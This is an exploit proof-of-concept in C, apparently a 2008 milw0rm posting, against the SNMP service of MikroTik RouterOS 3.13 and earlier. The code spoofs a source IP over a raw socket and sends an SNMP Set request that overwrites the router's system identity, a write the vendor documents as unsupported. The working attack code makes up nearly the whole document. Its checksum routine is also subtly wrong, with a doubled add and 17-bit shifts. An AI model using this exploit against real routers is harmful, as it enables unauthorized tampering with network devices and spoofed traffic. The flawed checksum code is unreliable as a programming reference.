<html><head><title>MicroTik RouterOS <= 3.13 SNMP write (Set request) PoC</title></head><pre>/*  --------------------------------------------------------------------------
 *                          (c) ShadOS 2008
 * 	       _  _     _ _ _  __     _      _   _       
 *	      | || |___| | | |/ /_ _ (_)__ _| |_| |_ ___ 
 *	      | __ / -_) | | ' &lt;| ' \| / _` | ' \  _(_-&lt; 
 *	      |_||_\___|_|_|_|\_\_||_|_\__, |_||_\__/__/ 
 *    	        hellknights.void.ru    |___/  .0x48k.    
 *
 *  --------------------------------------------------------------------------
 *
 *  Title: MicroTik RouterOS &lt;=3.13 SNMP write (Set request) PoC exploit. 
 *
 *  Vendor: www.mikrotik.com
 *
 *  Vulnerable versions: 2.9.51 (2.9.x branch), 3.13 (3.x branch)
 *  (prior versions also affected).
 *
 *  Funded: 03.09.2008 by ShadOS (http://hellknights.void.ru)
 *
 *  Let's see the manual:
 *  http://www.mikrotik.com/testdocs/ros/2.9/root/snmp_content.php
 *  
 *  
 *  [QUOTE]
 * 
 *  &gt; SNMP Service
 *  &gt;
 *  &gt; General Information
 *  &gt;
 *  &gt; Summary
 *  &gt;
 *  &gt; ... RouterOS supports only Get, which means that you can use this implementation only for network monitoring.
 *  &gt;
 *  &gt;
 *  &gt; The MikroTik RouterOS supports:
 *  &gt;
 *  &gt; SNMPv1 only
 *  &gt; Read-only access is provided to the NMS (network management system)
 *  &gt; User defined communities are supported
 *  &gt; Get and GetNext actions
 *  &gt; No Set support
 *  &gt; No Trap support
 *  &gt;
 *
 *  
 *  [/QUOTE]
 *
 * 
 *  Don't forget to visit our site and my homepage for new releases:
 *  http://hellknights.void.ru
 *  http://shados.freeweb7.com
 *  Also, you can mail me any bugs or suggestions:
 *  mailto: shados /at/ mail /dot/ ru
 *
 *  Thanks 2 cih.ms and all my friends. 
 *  --------------------------------------------------------------------------
 *
 *  Copyright (C) 89, 90, 91, 1995-2008 Free Software Foundation.
 *
 *  This program is free software; you can redistribute it and/or modify
 *  it under the terms of the GNU General Public License as published by
 *  the Free Software Foundation; either version 2, or (at your option)
 *  any later version.
 *
 *  This program is distributed in the hope that it will be useful,
 *  but WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 *  GNU General Public License for more details.
 *
 *  You should have received a copy of the GNU General Public License
 *  along with this program; if not, write to the Free Software Foundation,
 *  Inc., 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301, USA. 
 *
 *  -------------------------------------------------------------------------- 
 */ 

#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;netinet/in.h&gt;
#include &lt;netinet/ip.h&gt;
#include &lt;netinet/udp.h&gt;
#include &lt;netdb.h&gt;
#include &lt;memory.h&gt;
#include &lt;string.h&gt;


unsigned char evilcode[49] = {
0x33, 0x02, 0x01, 0x02, 0x02, 0x01, 0x00, 0x02, 0x01, 0x00, 0x30, 0x18, 0x30, 0x16, 0x06, 0x08, 
0x2B, 0x06, 0x01, 0x02, 0x01, 0x01, 0x05, 0x00, 0x04, 0x17, 0x57, 0x72, 0x69, 0x74, 0x65, 0x20, 
0x69, 0x73, 0x20, 0x6E, 0x6F, 0x74, 0x20, 0x73, 0x75, 0x70, 0x70, 0x6F, 0x72, 0x74, 0x65, 0x64, 
0x21
};

unsigned short in_cksum(addr, len)
u_short *addr;
int len;
{
   register int nleft = len;
   register u_short *w = addr;
   register int sum = 0;
   u_short answer = 0;

   while (nleft &gt; 1) {
      sum += *w++;
      sum += *w++;
      nleft -= 2;
   }
   if (nleft == 1) {
      *(u_char *) (&amp;answer) = *(u_char *) w;
      sum += answer;
   }
   sum = (sum &gt;&gt; 17) + (sum &amp; 0xffff);
   sum += (sum &gt;&gt; 17);
   answer = -sum;
   return (answer);
}

int sendudp(int sock,unsigned long *saddr, unsigned long *daddr,unsigned int sport,unsigned int dport,char *data, int len)
{
   char *packet;
   struct sockaddr_in dstaddr;
   struct iphdr *ip;
   struct udphdr *udp;
   packet = (char *)malloc(sizeof(struct iphdr) + sizeof(struct udphdr) + len);
   memset(packet,0,sizeof(struct iphdr) + sizeof(struct udphdr) + len);
   if (packet == NULL) { printf(&quot;Malloc failed\n&quot;); exit(-1); }
   ip = (struct iphdr *)packet;
   udp = (struct udphdr *)(packet+sizeof(struct iphdr));
   ip-&gt;saddr = *saddr;
   ip-&gt;daddr = *daddr;
   ip-&gt;version = 4;
   ip-&gt;ihl = 5;
   ip-&gt;ttl = 255;
   ip-&gt;id = htons((unsigned short) rand());
   ip-&gt;protocol = IPPROTO_UDP;
   ip-&gt;tot_len = htons(sizeof(struct iphdr) + sizeof(struct udphdr)+len);
   ip-&gt;check = in_cksum(ip, sizeof(struct iphdr));
   udp-&gt;source = htons(sport);
   udp-&gt;dest = htons(dport);
   udp-&gt;len = htons(sizeof(struct udphdr) + len);
   memcpy(packet + (sizeof(struct iphdr) + sizeof(struct udphdr)),data,len);
   dstaddr.sin_family = AF_INET;
   dstaddr.sin_addr.s_addr = *daddr;
   if (sendto(sock, packet, sizeof(struct iphdr) + sizeof(struct udphdr)+len,0,(struct sockaddr *)&amp;dstaddr,sizeof(struct sockaddr_in)) &lt; 0)
     perror(&quot;sendto() failed&quot;);
   free(packet);
}

char * makereq(char *community,int *size)
{
  char *buf;
  char *ptr;
  int len;
  int i;

  len = 7 + strlen(community) + sizeof(evilcode);
  buf = (char *)malloc(len);
  ptr = buf;

  *ptr++ = 0x30;
  *ptr++ = len;
  
  /* Snmp Version */
  *ptr++ = 0x02;
  *ptr++ = 0x01;
  *ptr++ = 0x00;
  
  /* Community */
  *ptr++ = 0x04;
  *ptr++ = strlen(community);
  strcpy(ptr,community);
  ptr = ptr + strlen(community);
  
  
  *ptr++ = 0xA3; /* Set Request */
  
  memcpy(ptr, evilcode, sizeof(evilcode));
  ptr = ptr + sizeof(evilcode);

  *size = len+1;
  
  return buf;
}

int erexit(char *msg)
{
  printf(&quot;%s\n&quot;,msg);
  exit (-1) ;
}

int usage()
{
  printf(&quot;Usage: ./snmpdos &lt;-s source&gt; &lt;-d dest&gt; &lt;-c community&gt;\n&quot;);
}

int main(int argc, char **argv)
{
  char *saddr,*daddr,*community;
  unsigned char *buf;
  int size;
  int sock;
  unsigned long lsaddr,ldaddr;
  int i;

  saddr = NULL;
  daddr = NULL;
  if (argc != 7) { usage(); erexit(&quot;not enough args\n&quot;); }

  if (!strcmp(argv[1],&quot;-s&quot;))
    saddr = strdup(argv[2]);
  if (!strcmp(argv[3],&quot;-d&quot;))
    daddr = strdup(argv[4]);
  if (!strcmp(argv[5],&quot;-c&quot;))
    community = strdup(argv[6]);

  printf(&quot;Ok, spoofing packets from %s to %s\n&quot;,saddr,daddr);

  if (inet_addr(saddr) == -1 || inet_addr(daddr) == -1) 
    erexit(&quot;Invalid source/destination IP address\n&quot;);

  if (saddr == NULL) { usage(); erexit(&quot;No Source Address&quot;); }
  if (daddr == NULL) { usage(); erexit(&quot;No Dest Address&quot;); }

  sock = socket(AF_INET,SOCK_RAW,IPPROTO_RAW);
  if (sock == -1) 
    erexit(&quot;Couldnt open Raw socket!(Are you root?)\n&quot;);

  lsaddr = inet_addr(saddr);
  ldaddr = inet_addr(daddr);

  buf = makereq(community,&amp;size);

  
  printf(&quot;Sending %d bytes buffer:\n&quot;,size);
  for (i=0;i&lt;size;i++)
     printf(&quot;0x%02x &quot;,buf[i]);
  printf(&quot;\n&quot;);
  
  sendudp(sock,&amp;lsaddr,&amp;ldaddr,32788,161,buf,size);
  fprintf(stdout,&quot;Sent packet. \&quot;/system identity\&quot; must be changed.\n&quot;);
  return 0;

}

// milw0rm.com [2008-09-05]</pre></html>